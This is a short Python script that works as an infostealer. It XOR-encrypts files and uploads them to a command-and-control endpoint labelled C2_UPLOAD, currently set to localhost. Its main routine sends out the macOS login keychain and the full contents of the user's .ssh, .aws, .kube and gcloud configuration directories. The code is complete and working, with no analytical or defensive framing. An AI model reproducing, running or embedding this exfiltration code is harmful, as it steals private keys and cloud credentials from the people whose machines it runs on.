import os
import requests
from pathlib import Path

SESSION_ID = "session1234"
XOR_KEY     = b"mysecretpassword"
C2_UPLOAD   = "http://localhost:1337/upload"
home = os.path.expanduser("~")

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def send_file(session_id: str, filepath: str):
    p = Path(filepath)
    if not p.is_file():
        print(f"[!] skipping missing file: {filepath}")
        return

    raw = p.read_bytes()
    enc = xor_encrypt(raw, XOR_KEY)
    files = {"file": (p.name, enc)}
    data  = {"session_id": session_id}
    resp = requests.post(C2_UPLOAD, files=files, data=data)
    resp.raise_for_status()
    print(f"[+] uploaded {filepath}")

def send_directory(session_id: str, alias: str, dirpath: str, recursive: bool=True):
    root = Path(dirpath)
    if not root.is_dir():
        print(f"[!] skipping missing directory: {dirpath}")
        return

    walker = root.rglob("*") if recursive else root.glob("*")
    for path in walker:
        if path.is_file():
            send_file(f"{session_id}-{alias}", str(path))

def get_info():
    while True:
        if not SESSION_ID:
            break

        # this list order matches your original
        #send_directory(SESSION_ID, "all",   home)
        send_file(    SESSION_ID, os.path.join(home, "Library", "Keychains", "login.keychain-db"))
        send_directory(SESSION_ID, "ssh",   os.path.join(home, ".ssh"), True)
        send_directory(SESSION_ID, "aws",   os.path.join(home, ".aws"), True)
        send_directory(SESSION_ID, "kube",  os.path.join(home, ".kube"), True)
        send_directory(SESSION_ID, "gcloud",os.path.join(home, ".config", "gcloud"), True)
        break

if __name__ == "__main__":
    get_info()
